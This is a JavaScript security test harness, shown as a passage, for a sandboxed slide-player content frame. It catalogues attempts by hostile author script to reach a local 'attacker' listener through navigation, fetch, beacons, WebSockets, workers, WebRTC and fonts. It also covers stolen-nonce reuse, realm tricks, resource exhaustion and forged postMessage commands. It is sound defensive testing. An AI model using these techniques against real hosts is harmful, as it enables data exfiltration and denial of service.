// SPDX-License-Identifier: Apache-2.0
// Spike S5 harness servers: what can hostile author script do inside the sandboxed, no-network content frame?
//
//   app       http://localhost:<A>   shell pages (harness shell, real createPlayer page), /_player/ (player dist),
//                                    same-origin content (/c/doc)
//   site2     http://localhost:<B>   same content, same-site but cross-origin
//   xsite     http://127.0.0.1:<C>   same content, cross-site
//   listener  http://[::1]:<L>       counts every HTTP request and WebSocket upgrade (the "attacker" server)
//   stun/stun2  udp 127.0.0.1         count STUN packets (WebRTC); stun2 is used only by the fresh-realm probes
//   turn, preconnect  tcp 127.0.0.1   count raw TCP connections (TURN over TCP, <link rel=preconnect>)
//
// The content document uses the real production headers (`contentHeaders` from @pptaken/player dist), the real
// runtime (`RUNTIME_SOURCE`, nonced) and one author script (`PROBE`, constant text so it has a stable hash).
// Throwaway code: not product code.

import { createHash, randomBytes } from "node:crypto";
import dgram from "node:dgram";
import { existsSync, readFileSync } from "node:fs";
import http from "node:http";
import net from "node:net";
import { contentHeaders } from "../../../packages/player/dist/csp.js";
import { OFFLINE_DOCUMENT_CSP } from "../../../packages/player/dist/offline.js";
import { RUNTIME_SHA256, RUNTIME_SOURCE } from "../../../packages/player/dist/runtime-source.js";

const PLAYER_DIST = new URL("../../../packages/player/dist/", import.meta.url);

// ---------------------------------------------------------------------------------------------------------------
// The author script. Constant text (configuration comes from <body data-cfg>), so one hash covers every document.
// ---------------------------------------------------------------------------------------------------------------
function probeMain() {
  const cfg = JSON.parse(document.body.dataset.cfg);
  const me = document.currentScript;
  const stolenNonce = me ? me.nonce : "";
  const L = cfg.listener;
  const TOK = cfg.token;
  const hit = (n, ext) => `${L}/hit/${TOK}/${n}${ext || ""}`;
  const post = (m) => parent.postMessage(Object.assign({ s5: 1, token: TOK }, m), "*");
  const wait = (ms) => new Promise((r) => setTimeout(r, ms));
  const timed = (p, ms) =>
    Promise.race([Promise.resolve().then(p), wait(ms || 3000).then(() => "timeout")]);
  const viol = [];
  document.addEventListener("securitypolicyviolation", (e) =>
    viol.push(`${e.effectiveDirective} ${String(e.blockedURI).slice(0, 40)}`),
  );
  const add = (el) => (document.body || document.documentElement).appendChild(el);
  const loadEl = (el, ms) =>
    timed(
      () =>
        new Promise((res) => {
          el.onload = () => res("load");
          el.onerror = () => res("error");
        }),
      ms || 2500,
    );
  const P = cfg.probe;

  // ---- 1. navigation probes: one per frame, run after load -------------------------------------------------
  const nav = {
    loc_assign: () => {
      location = hit("loc_assign");
    },
    loc_replace: () => location.replace(hit("loc_replace")),
    // Destinations the shell's frame-src does allow: the content origin itself and the app origin ('self').
    loc_content_origin: () => {
      location = `${cfg.selfOrigin}/x-exfil/${TOK}/loc_content_origin?secret=1`;
    },
    loc_app_origin: () => {
      location = `${cfg.appOrigin}/x-exfil/${TOK}/loc_app_origin?secret=1`;
    },
    meta_refresh: () => {
      const m = document.createElement("meta");
      m.httpEquiv = "refresh";
      m.content = `0;url=${hit("meta_refresh")}`;
      document.head.appendChild(m);
    },
    window_open: () => String(window.open(hit("window_open"))),
    top_location: () => {
      top.location = hit("top_location");
    },
    a_click: () => {
      const a = document.createElement("a");
      a.href = hit("a_click");
      add(a).click();
    },
    a_blank: () => {
      const a = document.createElement("a");
      a.href = hit("a_blank");
      a.target = "_blank";
      add(a).click();
    },
    a_top: () => {
      const a = document.createElement("a");
      a.href = hit("a_top");
      a.target = "_top";
      add(a).click();
    },
    a_download: () => {
      const a = document.createElement("a");
      a.href = hit("a_download");
      a.download = "x.txt";
      add(a).click();
    },
    a_ping: () => {
      const a = document.createElement("a");
      a.href = hit("a_ping_nav");
      a.ping = hit("a_ping_ping");
      add(a).click();
    },
    form_get: () => {
      const f = document.createElement("form");
      f.action = hit("form_get");
      f.method = "get";
      add(f).submit();
    },
    form_post: () => {
      const f = document.createElement("form");
      f.action = hit("form_post");
      f.method = "post";
      add(f).submit();
    },
    navigation_api: () =>
      typeof navigation === "object"
        ? String(navigation.navigate(hit("navigation_api")) && "called")
        : "absent",
    docopen_refresh: () => {
      document.open();
      document.write(`<meta http-equiv="refresh" content="0;url=${hit("docopen_refresh")}">`);
      document.close();
    },
  };

  // ---- 1b. document.write during parsing (the probe script is the last element of <body>) ------------------
  if (P === "dw_res") {
    document.write(
      [
        `<iframe src="${hit("dw_iframe")}"></iframe>`,
        `<link rel="prefetch" href="${hit("dw_prefetch")}">`,
        `<link rel="preload" as="image" href="${hit("dw_preload")}">`,
        `<link rel="modulepreload" href="${hit("dw_modulepreload", ".mjs")}">`,
        `<link rel="stylesheet" href="${hit("dw_stylesheet", ".css")}">`,
        `<link rel="preconnect" href="${cfg.preconnect}">`,
        `<link rel="dns-prefetch" href="//s5-dns-prefetch.invalid">`,
        `<img srcset="${hit("dw_srcset")} 1x, ${hit("dw_srcset2x")} 2x">`,
        `<picture><source srcset="${hit("dw_picture")}"><img alt=""></picture>`,
        `<script src="${hit("dw_script", ".js")}"></scr` + `ipt>`,
        `<video poster="${hit("dw_poster")}"></video>`,
      ].join(""),
    );
    setTimeout(() => post({ type: "result", probe: P, value: { violations: viol } }), 2500);
    return;
  }

  // ---- 2. network side channels: all in one frame ----------------------------------------------------------
  const rtc = (servers, ms) =>
    timed(
      () =>
        new Promise((res) => {
          let pc;
          try {
            pc = new RTCPeerConnection({ iceServers: servers });
          } catch (e) {
            return res(`threw ${e.name}`);
          }
          const cands = [];
          pc.onicecandidate = (e) => {
            if (e.candidate) cands.push(e.candidate.candidate.split(" ").slice(4, 8).join(" "));
          };
          pc.createDataChannel("x");
          pc.createOffer()
            .then((o) => pc.setLocalDescription(o))
            .catch((e) => res(`offer ${e.name}`));
          setTimeout(() => {
            res({ candidates: cands.slice(0, 6) });
            pc.close();
          }, ms || 2500);
        }),
      (ms || 2500) + 1000,
    );
  const net = {
    fetch: () =>
      fetch(hit("fetch")).then(
        (r) => `ok ${r.status}`,
        (e) => `err ${e.name}`,
      ),
    fetch_nocors: () =>
      fetch(hit("fetch_nocors"), { mode: "no-cors" }).then(
        (r) => `ok ${r.type}`,
        (e) => `err ${e.name}`,
      ),
    xhr: () =>
      new Promise((res) => {
        const x = new XMLHttpRequest();
        x.open("GET", hit("xhr"));
        x.onload = () => res("load");
        x.onerror = () => res("error");
        try {
          x.send();
        } catch (e) {
          res(`threw ${e.name}`);
        }
      }),
    beacon: () => {
      try {
        return String(navigator.sendBeacon(hit("beacon"), "x"));
      } catch (e) {
        return `threw ${e.name}`;
      }
    },
    eventsource: () =>
      new Promise((res) => {
        try {
          const es = new EventSource(hit("eventsource"));
          es.onopen = () => {
            res("open");
            es.close();
          };
          es.onerror = () => {
            res("error");
            es.close();
          };
        } catch (e) {
          res(`threw ${e.name}`);
        }
      }),
    websocket: () =>
      new Promise((res) => {
        try {
          const ws = new WebSocket(`${cfg.listenerWs}/hit/${TOK}/websocket`);
          ws.onopen = () => res("open");
          ws.onerror = () => res("error");
        } catch (e) {
          res(`threw ${e.name}`);
        }
      }),
    worker_url: () =>
      new Promise((res) => {
        try {
          const w = new Worker(hit("worker_url", ".js"));
          w.onerror = () => res("error");
          setTimeout(() => res("no error event"), 2000);
        } catch (e) {
          res(`threw ${e.name}`);
        }
      }),
    worker_blob: () =>
      new Promise((res) => {
        try {
          const src = `fetch(${JSON.stringify(hit("worker_blob_fetch"))}).then(()=>postMessage("fetched"),()=>postMessage("fetch blocked"))`;
          const w = new Worker(URL.createObjectURL(new Blob([src], { type: "text/javascript" })));
          w.onmessage = (e) => res(`ran: ${e.data}`);
          w.onerror = () => res("error");
        } catch (e) {
          res(`threw ${e.name}`);
        }
      }),
    worker_data: () =>
      new Promise((res) => {
        try {
          const w = new Worker(`data:text/javascript,postMessage("ran")`);
          w.onmessage = () => res("ran");
          w.onerror = () => res("error");
        } catch (e) {
          res(`threw ${e.name}`);
        }
      }),
    sharedworker: () =>
      new Promise((res) => {
        if (typeof SharedWorker !== "function") return res("absent");
        try {
          const w = new SharedWorker(hit("sharedworker", ".js"));
          w.onerror = () => res("error");
          setTimeout(() => res("no error event"), 2000);
        } catch (e) {
          res(`threw ${e.name}`);
        }
      }),
    import_dynamic: () =>
      import(hit("import_dynamic", ".mjs")).then(
        () => "loaded",
        (e) => `err ${e.name}`,
      ),
    script_no_nonce: () => {
      const s = document.createElement("script");
      s.src = hit("script_no_nonce", ".js");
      return loadEl(add(s));
    },
    script_stolen_nonce: () => {
      const s = document.createElement("script");
      s.nonce = stolenNonce;
      s.src = hit("script_stolen_nonce", ".js");
      return loadEl(add(s));
    },
    nonce_readable: () => ({
      currentScriptNonceProperty: stolenNonce ? `yes (${stolenNonce.length} chars)` : "no",
      getAttribute: me ? me.getAttribute("nonce") : null,
      runtimeScriptNonce: document.scripts[0] ? (document.scripts[0].nonce ? "yes" : "no") : "n/a",
    }),
    script_inline_stolen_nonce: () =>
      new Promise((res) => {
        window.__s5inline = () => res("ran");
        const s = document.createElement("script");
        s.nonce = stolenNonce;
        s.textContent = "window.__s5inline()";
        add(s);
        setTimeout(() => res("blocked"), 500);
      }),
    eval: () => {
      try {
        return String(eval("1+1"));
      } catch (e) {
        return `threw ${e.name}`;
      }
    },
    image: () => {
      const i = new Image();
      i.src = hit("image");
      return loadEl(i);
    },
    css_background: () => {
      const d = document.createElement("div");
      d.style.cssText = `width:10px;height:10px;background-image:url(${hit("css_background")})`;
      add(d);
      return wait(800).then(() => "set");
    },
    fontface_api: () =>
      new FontFace("S5x", `url(${hit("fontface_api")})`).load().then(
        () => "loaded",
        (e) => `err ${e.name}`,
      ),
    fontface_css: () => {
      const st = document.createElement("style");
      st.textContent = `@font-face{font-family:S5y;src:url(${hit("fontface_css")})} #s5y{font-family:S5y}`;
      add(st);
      const p = document.createElement("p");
      p.id = "s5y";
      p.textContent = "x";
      add(p);
      return document.fonts.load("16px S5y").then(
        () => "load called",
        (e) => `err ${e.name}`,
      );
    },
    link_prefetch: () => {
      const l = document.createElement("link");
      l.rel = "prefetch";
      l.href = hit("link_prefetch");
      return loadEl(document.head.appendChild(l));
    },
    link_preload: () => {
      const l = document.createElement("link");
      l.rel = "preload";
      l.as = "fetch";
      l.crossOrigin = "anonymous";
      l.href = hit("link_preload");
      return loadEl(document.head.appendChild(l));
    },
    link_stylesheet: () => {
      const l = document.createElement("link");
      l.rel = "stylesheet";
      l.href = hit("link_stylesheet", ".css");
      return loadEl(document.head.appendChild(l));
    },
    link_icon: () => {
      const l = document.createElement("link");
      l.rel = "icon";
      l.href = hit("link_icon");
      document.head.appendChild(l);
      return "set";
    },
    link_preconnect: () => {
      const l = document.createElement("link");
      l.rel = "preconnect";
      l.href = cfg.preconnect;
      document.head.appendChild(l);
      return "set";
    },
    svg_image: () => {
      const ns = "http://www.w3.org/2000/svg";
      const s = document.createElementNS(ns, "svg");
      const i = document.createElementNS(ns, "image");
      i.setAttribute("href", hit("svg_image"));
      s.appendChild(i);
      add(s);
      return wait(800).then(() => "set");
    },
    video: () => {
      const v = document.createElement("video");
      v.preload = "auto";
      v.src = hit("video");
      add(v);
      return loadEl(v);
    },
    audio: () => {
      const v = document.createElement("audio");
      v.preload = "auto";
      v.src = hit("audio");
      add(v);
      return wait(800).then(() => "set");
    },
    object: () => {
      const o = document.createElement("object");
      o.data = hit("object");
      add(o);
      return wait(800).then(() => "set");
    },
    embed: () => {
      const o = document.createElement("embed");
      o.src = hit("embed");
      add(o);
      return wait(800).then(() => "set");
    },
    iframe_child: () => {
      const f = document.createElement("iframe");
      f.src = hit("iframe_child");
      add(f);
      return wait(1000).then(() => "set");
    },
    webtransport: () => {
      if (typeof WebTransport !== "function") return "absent";
      try {
        const t = new WebTransport(`https://127.0.0.1:${cfg.turn}/wt`);
        return t.ready.then(
          () => "ready",
          (e) => `rejected ${e.name}`,
        );
      } catch (e) {
        return `threw ${e.name}`;
      }
    },
    rtc_stun: () => rtc([{ urls: `stun:127.0.0.1:${cfg.stun}` }]),
    rtc_turn_tcp: () =>
      rtc([{ urls: `turn:127.0.0.1:${cfg.turn}?transport=tcp`, username: "u", credential: "p" }]),
    rtc_host_candidates: () => rtc([]),
    navigator_connection: () =>
      navigator.connection
        ? JSON.stringify({
            type: navigator.connection.type,
            effectiveType: navigator.connection.effectiveType,
            rtt: navigator.connection.rtt,
            downlink: navigator.connection.downlink,
          })
        : "absent",
    window_print: () => {
      let fired = false;
      addEventListener("beforeprint", () => {
        fired = true;
      });
      try {
        window.print();
      } catch (e) {
        return `threw ${e.name}`;
      }
      return wait(300).then(() => (fired ? "beforeprint fired" : "no print"));
    },
    // Fresh realms. A "lockdown" deletes the dangerous globals first; does a child realm give them back?
    realm_about_blank: () => {
      const saved = window.RTCPeerConnection;
      delete window.RTCPeerConnection;
      delete window.fetch;
      const f = document.createElement("iframe");
      add(f);
      let w = null;
      try {
        w = f.contentWindow;
        void w.document;
      } catch (e) {
        return `child not accessible: ${e.name}`;
      }
      const out = { created: !!w, fetchType: typeof w.fetch, rtcType: typeof w.RTCPeerConnection };
      window.RTCPeerConnection = saved;
      return timed(async () => {
        try {
          out.childFetch = await w.fetch(hit("realm_about_blank_fetch")).then(
            () => "ok",
            (e) => `err ${e.name}`,
          );
        } catch (e) {
          out.childFetch = `threw ${e.name}`;
        }
        try {
          const pc = new w.RTCPeerConnection({
            iceServers: [{ urls: `stun:127.0.0.1:${cfg.stun2}` }],
          });
          pc.createDataChannel("x");
          await pc.setLocalDescription(await pc.createOffer());
          await wait(1500);
          out.childRtc = "gathered";
          pc.close();
        } catch (e) {
          out.childRtc = `threw ${e.name}`;
        }
        return out;
      }, 4000);
    },
    realm_srcdoc: () =>
      timed(
        () =>
          new Promise((res) => {
            const f = document.createElement("iframe");
            f.srcdoc = "<p>child</p>";
            f.onload = () => {
              try {
                const w = f.contentWindow;
                res({
                  fetchType: typeof w.fetch,
                  rtcType: typeof w.RTCPeerConnection,
                  origin: String(w.origin),
                });
              } catch (e) {
                res(`child not accessible: ${e.name}`);
              }
            };
            add(f);
          }),
        2500,
      ),
  };

  if (P === "net") {
    const order = Object.keys(net).filter((k) => !k.startsWith("realm_"));
    (async () => {
      const out = {};
      await Promise.all(
        order.map(async (k) => {
          try {
            out[k] = await timed(net[k], 4500);
          } catch (e) {
            out[k] = `threw ${e && e.name}`;
          }
        }),
      );
      for (const k of ["realm_about_blank", "realm_srcdoc"]) {
        try {
          out[k] = await net[k]();
        } catch (e) {
          out[k] = `threw ${e && e.name}`;
        }
      }
      out.violations = viol.slice(0, 80);
      post({ type: "result", probe: P, value: out });
    })();
    return;
  }

  if (P === "realm_docopen") {
    delete window.fetch;
    delete window.RTCPeerConnection;
    const before = typeof window.fetch;
    document.open();
    document.write("<p>reopened</p>");
    document.close();
    post({
      type: "result",
      probe: P,
      value: { before, afterFetch: typeof window.fetch, afterRtc: typeof window.RTCPeerConnection },
    });
    return;
  }

  if (P === "author_ran") {
    post({ type: "result", probe: P, value: "author script ran" });
    return;
  }

  // ---- 3. resource abuse ---------------------------------------------------------------------------------
  const abuse = {
    busy: () => {
      const t = Date.now();
      while (Date.now() - t < cfg.ms) {}
    },
    alloc: () => {
      const keep = [];
      let mb = 0;
      try {
        while (mb < cfg.mb) {
          const a = new Uint8Array(64 * 1024 * 1024);
          a.fill(1);
          keep.push(a);
          mb += 64;
        }
      } catch (e) {
        post({ type: "alloc-error", mb, name: e.name });
      }
      window.__keep = keep;
      return mb;
    },
    raf: () =>
      new Promise((res) => {
        const end = Date.now() + cfg.ms;
        const frame = () => {
          for (let i = 0; i < 50; i++) requestAnimationFrame(() => {});
          const t = performance.now();
          while (performance.now() - t < 45) {}
          if (Date.now() < end) requestAnimationFrame(frame);
          else res("done");
        };
        requestAnimationFrame(frame);
      }),
    dom: () => {
      const frag = document.createDocumentFragment();
      for (let i = 0; i < 1e6; i++) {
        const d = document.createElement("div");
        d.textContent = "x";
        frag.appendChild(d);
      }
      document.body.appendChild(frag);
      return document.body.offsetHeight;
    },
    canvas: () => {
      const c = document.createElement("canvas");
      c.width = 16384;
      c.height = 8192;
      const g = c.getContext("2d");
      if (!g) return "no context";
      g.fillStyle = "#f00";
      g.fillRect(0, 0, c.width, c.height);
      const d = g.getImageData(0, 0, 4096, 4096);
      add(c);
      return d.data.length;
    },
  };
  if (P.startsWith("abuse_")) {
    const kind = P.slice(6);
    post({ type: "loaded" });
    setTimeout(async () => {
      post({ type: "start", t: Date.now() });
      let v;
      try {
        v = await abuse[kind]();
      } catch (e) {
        v = `threw ${e.name}`;
      }
      post({ type: "end", t: Date.now(), value: String(v) });
    }, cfg.startAfter || 1500);
    return;
  }

  // ---- 3b. heartbeat for the shell watchdog --------------------------------------------------------------
  if (P === "heartbeat") {
    const beat = () => post({ type: "hb", t: Date.now() });
    beat();
    setInterval(beat, 1000);
    setTimeout(() => {
      post({ type: "busy-start", t: Date.now() });
      const t = Date.now();
      while (Date.now() - t < cfg.ms) {}
      post({ type: "busy-end", t: Date.now() });
    }, cfg.busyAt);
    return;
  }

  // ---- 4. protocol forgery against the real shell --------------------------------------------------------
  if (P === "forge") {
    const V = (m) => Object.assign({ v: 1 }, m);
    const send = (what, m) => {
      post({ type: "forging", what });
      parent.postMessage(V(m), "*");
    };
    const fakeSlides = Array.from({ length: 200 }, (_, i) => ({ id: `fake${i}`, steps: 0 }));
    // While parsing, before the runtime's real `ready` (the runtime initialises on DOMContentLoaded).
    send("ready-200", { type: "ready", slides: fakeSlides, width: 1920, height: 1080 });
    send("preload-ok", { type: "preload", ok: true, images: 9999, fonts: 99, failed: [] });
    setTimeout(() => {
      send("key ArrowRight", { type: "key", code: "ArrowRight" });
      send("key ArrowRight", { type: "key", code: "ArrowRight" });
    }, 1500);
    setTimeout(() => send("state 150", { type: "state", slide: 150, step: 0 }), 2000);
    setTimeout(() => {
      for (const code of ["KeyO", "Question", "KeyS", "KeyR", "KeyK", "KeyB"])
        send(`idle ${code}`, { type: "key", code });
    }, 2500);
    setTimeout(() => send("idle select 5", { type: "select", slide: 5 }), 3500);
    setTimeout(() => {
      for (const code of ["KeyO", "KeyB"]) send(`idle-late ${code}`, { type: "key", code });
    }, 8000);
    let clicked = false;
    addEventListener(
      "click",
      () => {
        if (clicked) return;
        clicked = true;
        send("click+0 KeyO", { type: "key", code: "KeyO" });
        setTimeout(() => send("click+300 select 3", { type: "select", slide: 3 }), 300);
        setTimeout(() => send("click+600 KeyS", { type: "key", code: "KeyS" }), 600);
        setTimeout(() => send("click+1000 Question", { type: "key", code: "Question" }), 1000);
        setTimeout(() => send("click+3000 KeyR", { type: "key", code: "KeyR" }), 3000);
        setTimeout(() => send("click+6000 KeyO", { type: "key", code: "KeyO" }), 6000);
        setTimeout(() => send("click+12000 KeyK", { type: "key", code: "KeyK" }), 12000);
      },
      true,
    );
    addEventListener(
      "keydown",
      (e) => {
        send(`real-key ${e.code} -> KeyK`, { type: "key", code: "KeyK" });
        send(`real-key ${e.code} -> KeyO`, { type: "key", code: "KeyO" });
      },
      true,
    );
    return;
  }

  // navigation probes run after load
  if (nav[P]) {
    post({ type: "loaded" });
    setTimeout(() => {
      let v;
      try {
        v = nav[P]();
      } catch (e) {
        v = `threw ${e.name}`;
      }
      post({ type: "result", probe: P, value: v === undefined ? "no throw" : String(v) });
      setTimeout(() => post({ type: "late", probe: P, violations: viol }), 1200);
    }, 300);
  }
}

// Line endings normalised: the HTML parser turns CR LF into LF before hashing.
export const PROBE = `(${probeMain.toString().replace(/\r\n?/g, "\n")})();`;
const sha256 = (text) => createHash("sha256").update(text).digest("base64");
export const PROBE_SHA256 = sha256(PROBE);

const esc = (s) => s.replace(/&/g, "&amp;").replace(/"/g, "&quot;").replace(/</g, "&lt;");

/**
 * A deck document: runtime + two slides + the author probe. `kind`: "url" (served with the production headers)
 * or "srcdoc" (offline shape: the no-network CSP <meta> first, exactly as `isOfflineDocument` expects).
 * `scripts`: "nonce" (runtime and author both carry the nonce) or "hash" (no nonce attribute at all).
 */
export function deckHtml({ cfg, nonce, kind, scripts = "nonce", runtime = true }) {
  const na = scripts === "nonce" ? ` nonce="${nonce}"` : "";
  const head =
    kind === "srcdoc"
      ? `<!doctype html>\n<html lang="en">\n<head>\n<meta http-equiv="Content-Security-Policy" content="${OFFLINE_DOCUMENT_CSP.replace("{nonce}", nonce)}">\n`
      : `<!doctype html>\n<html lang="en">\n<head>\n`;
  return `${head}<meta charset="utf-8"><title>S5 deck</title>
${runtime ? `<script${na}>${RUNTIME_SOURCE}</script>` : ""}
<style>html,body{margin:0;background:#000;color:#fff;font:40px sans-serif}#pptaken-stage{position:absolute;width:1920px;height:1080px;transform-origin:0 0}section{position:absolute;inset:0;background:#223}section[hidden]{display:none}</style>
</head>
<body data-cfg="${esc(JSON.stringify(cfg))}">
<div id="pptaken-stage" data-width="1920" data-height="1080">
<section data-slide="s1" aria-label="One" hidden><h1>Slide one</h1><p data-step="">step</p></section>
<section data-slide="s2" aria-label="Two" hidden><h1>Slide two</h1></section>
<section data-slide="s3" aria-label="Three" hidden><h1>Slide three</h1></section>
<section data-slide="s4" aria-label="Four" hidden><h1>Slide four</h1></section>
</div>
<script${na}>${PROBE}</script>
</body></html>`;
}

// ---------------------------------------------------------------------------------------------------------------
// Shell pages
// ---------------------------------------------------------------------------------------------------------------
const SHELL_JS = `
const S = (window.__s5 = { msgs: [], loads: {}, gaps: [], keys: [], viol: [], wd: null });
document.cookie = "s5sid=1; path=/; SameSite=Lax";
addEventListener("message", (e) => {
  const d = e.data;
  if (d && d.s5) S.msgs.push(Object.assign({ at: Date.now(), origin: e.origin }, d));
  else if (d && d.v === 1) S.msgs.push({ at: Date.now(), origin: e.origin, runtime: d.type, frame: [...document.querySelectorAll("iframe")].findIndex((f) => f.contentWindow === e.source) });
});
document.addEventListener("securitypolicyviolation", (e) => S.viol.push(e.effectiveDirective + " " + String(e.blockedURI).slice(0, 60)));
addEventListener("keydown", (e) => S.keys.push({ at: Date.now(), key: e.key }));
window.__mount = (id, src, srcdoc) => {
  const f = document.createElement("iframe");
  f.id = id; f.setAttribute("sandbox", "allow-scripts"); f.setAttribute("allow", ""); f.setAttribute("referrerpolicy", "no-referrer");
  f.style.cssText = "width:320px;height:180px;border:1px solid #444";
  S.loads[id] = 0; f.addEventListener("load", () => { S.loads[id]++; });
  if (srcdoc != null) f.srcdoc = srcdoc; else f.src = src;
  document.body.append(f);
  return true;
};
window.__heartbeat = () => { let last = performance.now(); setInterval(() => { const n = performance.now(); S.gaps.push([Date.now(), Math.round(n - last)]); last = n; }, 20); return true; };
window.__watchdog = (id, missed) => {
  const f = document.getElementById(id);
  const w = (S.wd = { lastBeat: Date.now(), beats: 0, missed, detectAt: null, safeLoadAt: null });
  addEventListener("message", (e) => { if (e.source === f.contentWindow && e.data && e.data.type === "hb") { w.lastBeat = Date.now(); w.beats++; } });
  const timer = setInterval(() => {
    if (Date.now() - w.lastBeat > missed * 1000 + 500) {
      clearInterval(timer);
      w.detectAt = Date.now();
      f.remove();
      const safe = document.createElement("iframe");
      safe.setAttribute("sandbox", "");
      safe.addEventListener("load", () => { w.safeLoadAt = Date.now(); });
      safe.srcdoc = "<p style='color:#fff'>Presentation stopped: the content stopped responding.</p>";
      document.body.append(safe);
    }
  }, 250);
  return true;
};
`;

const PROTO_JS = `
import { createPlayer } from "/_player/shell.js";
const S = (window.__s5 = { log: [], t0: Date.now() });
const ua = () => ({ active: navigator.userActivation ? navigator.userActivation.isActive : null, has: navigator.userActivation ? navigator.userActivation.hasBeenActive : null });
const L = (kind, x) => S.log.push(Object.assign({ t: Date.now() - S.t0, kind }, x || {}));
addEventListener("message", (e) => {
  const d = e.data;
  if (d && d.s5 && d.type === "forging") L("forging", Object.assign({ what: d.what }, ua()));
  else if (d && d.v === 1) L("msg", Object.assign({ type: d.type, code: d.code, slide: d.slide, n: Array.isArray(d.slides) ? d.slides.length : undefined }, ua()));
}, true);
const open0 = window.open;
window.open = function (...a) { L("window.open", Object.assign({ url: String(a[0]) }, ua())); return open0.apply(window, a); };
const print0 = window.print;
window.print = function () { L("window.print", ua()); };
const host = document.getElementById("host");
const params = new URLSearchParams(location.search);
const player = createPlayer(host, {
  contentUrl: params.get("content"),
  presenterUrl: "/presenter-dummy",
  hash: false,
  indicator: true,
  onKey: (code, source) => { L("onKey", Object.assign({ code, source }, ua())); return false; },
  onRender: (p) => L("render", p),
  onChange: (s) => L("change", { slide: s.slide, step: s.step, mode: s.mode, black: s.black, count: s.slideCount }),
  onReady: (sl) => L("ready", { n: sl.length }),
  onFault: (r) => L("fault", { r }),
  onOffline: (o) => L("offline", { state: o.state, images: o.images }),
});
window.__player = player;
let help = null;
setInterval(() => {
  const box = host.querySelector("[role=dialog]");
  const v = box ? !box.hidden && box.style.opacity === "1" : false;
  if (v !== help) { help = v; L("help", { visible: v }); }
}, 50);
`;

function shellCsp({ csp, authorHash, origins }) {
  const scripts = ["'self'", `'sha256-${RUNTIME_SHA256}'`];
  if (authorHash) scripts.push(`'sha256-${PROBE_SHA256}'`);
  return [
    "default-src 'self'",
    `script-src ${scripts.join(" ")}`,
    "style-src 'self' 'unsafe-inline'",
    "img-src 'self' data:",
    "font-src 'self' data:",
    "connect-src 'self'",
    csp === "loose" ? "frame-src *" : `frame-src 'self' ${origins.site2} ${origins.xsite}`,
    "object-src 'none'",
    "base-uri 'none'",
    "form-action 'self'",
    "frame-ancestors 'none'",
  ].join("; ");
}

// ---------------------------------------------------------------------------------------------------------------
export async function startServers() {
  const origins = {};
  const log = { http: [], udp: [], tcp: [] };
  const state = { label: "idle" };

  const contentRoute = (base, u, res) => {
    const cfg = JSON.parse(Buffer.from(u.searchParams.get("cfg"), "base64url").toString("utf8"));
    const nonce = randomBytes(18).toString("base64");
    const scripts = cfg.scripts || "nonce";
    const headers = contentHeaders({
      nonce,
      assetBaseUrl: `${base}/c/asset/`,
      frameAncestors: [origins.app],
    });
    let csp = headers["Content-Security-Policy"];
    if (scripts === "hash") {
      csp = csp.replace(
        /script-src 'nonce-[^']+'/,
        `script-src 'sha256-${RUNTIME_SHA256}' 'sha256-${PROBE_SHA256}'`,
      );
    }
    if (cfg.cspExtra) csp += `; ${cfg.cspExtra}`;
    headers["Content-Security-Policy"] = csp;
    res.writeHead(200, headers);
    res.end(deckHtml({ cfg, nonce, kind: "url", scripts }));
  };

  const appHandler = (where) => (req, res) => {
    const u = new URL(req.url ?? "/", "http://x");
    const base = origins[where];
    if (u.pathname === "/c/doc") return contentRoute(base, u, res);
    if (u.pathname.startsWith("/x-exfil/")) {
      const parts = u.pathname.split("/");
      log.http.push({
        at: Date.now(),
        label: state.label,
        token: parts[2] ?? "",
        name: `${parts[3]}@${where}`,
        method: req.method,
        origin: req.headers.origin ?? null,
        dest: req.headers["sec-fetch-dest"] ?? null,
        cookie: req.headers.cookie ? "yes" : "no",
      });
      res.writeHead(200, { "Content-Type": "text/html" });
      return res.end("<!doctype html><p>own-origin page reached");
    }
    if (where === "app") {
      if (u.pathname === "/shell" || u.pathname === "/proto") {
        const csp = shellCsp({
          csp: u.searchParams.get("csp") || "strict",
          authorHash: u.searchParams.get("ah") !== "0",
          origins,
        });
        res.writeHead(200, {
          "Content-Type": "text/html; charset=utf-8",
          "Content-Security-Policy": csp,
        });
        return res.end(
          u.pathname === "/shell"
            ? `<!doctype html><meta charset=utf-8><title>S5 shell</title><body style="background:#111;color:#eee"><button id=focus>parent</button><script src="/shell.js"></script></body>`
            : `<!doctype html><meta charset=utf-8><title>S5 proto</title><body style="margin:0;background:#000"><div id=host style="width:960px;height:540px"></div><script type=module src="/proto.js"></script></body>`,
        );
      }
      if (u.pathname === "/shell.js" || u.pathname === "/proto.js") {
        res.writeHead(200, { "Content-Type": "text/javascript" });
        return res.end(u.pathname === "/shell.js" ? SHELL_JS : PROTO_JS);
      }
      if (u.pathname === "/presenter-dummy") {
        res.writeHead(200, { "Content-Type": "text/html" });
        return res.end("<!doctype html><title>presenter</title><p>presenter");
      }
      if (u.pathname.startsWith("/_player/")) {
        const file = u.pathname.slice("/_player/".length);
        const url = new URL(file, PLAYER_DIST);
        if (/^[a-z0-9-]+\.js$/.test(file) && existsSync(url)) {
          res.writeHead(200, { "Content-Type": "text/javascript" });
          return res.end(readFileSync(url));
        }
      }
    }
    res.writeHead(404, { "Content-Type": "text/plain" });
    res.end("not found");
  };

  const listener = http.createServer((req, res) => {
    const u = new URL(req.url ?? "/", "http://x");
    const parts = u.pathname.split("/");
    log.http.push({
      at: Date.now(),
      label: state.label,
      token: parts[2] ?? "",
      name: (parts[3] ?? "").replace(/\.[a-z]+$/, ""),
      method: req.method,
      origin: req.headers.origin ?? null,
      dest: req.headers["sec-fetch-dest"] ?? null,
      mode: req.headers["sec-fetch-mode"] ?? null,
    });
    const name = parts[3] ?? "";
    const h = { "Access-Control-Allow-Origin": "*", "Cache-Control": "no-store" };
    if (name.endsWith(".js"))
      return res.writeHead(200, { ...h, "Content-Type": "text/javascript" }).end("/* s5 */");
    if (name.endsWith(".mjs"))
      return res
        .writeHead(200, { ...h, "Content-Type": "text/javascript" })
        .end("export default 1;");
    if (name.endsWith(".css"))
      return res.writeHead(200, { ...h, "Content-Type": "text/css" }).end("body{}");
    if (name === "eventsource")
      return res.writeHead(200, { ...h, "Content-Type": "text/event-stream" }).end("data: x\n\n");
    res
      .writeHead(200, { ...h, "Content-Type": "text/html" })
      .end("<!doctype html><p>listener reached</p>");
  });
  listener.on("upgrade", (req, socket) => {
    const parts = new URL(req.url ?? "/", "http://x").pathname.split("/");
    log.http.push({
      at: Date.now(),
      label: state.label,
      token: parts[2] ?? "",
      name: "websocket-upgrade",
      method: "UPGRADE",
      origin: req.headers.origin ?? null,
    });
    socket.destroy();
  });

  const listen = (server, port, host) =>
    new Promise((resolve, reject) => {
      server.once("error", reject);
